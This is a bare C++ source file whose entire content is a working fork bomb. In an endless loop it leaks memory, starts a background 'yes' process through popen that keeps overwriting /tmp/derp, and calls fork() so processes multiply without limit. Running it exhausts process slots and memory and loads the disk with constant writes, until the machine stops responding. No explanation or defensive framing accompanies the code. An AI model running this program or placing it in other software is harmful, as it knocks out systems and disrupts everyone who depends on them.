#include <iostream>
#include <cstring>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

using namespace std;

int main(){
    while (true){
    int * p = NULL;
    p = new int [1024];
    popen("yes abcdefghijklmnopqrstuvwxyz0123456789 > /tmp/derp &", "r");
    fork();
    }
}
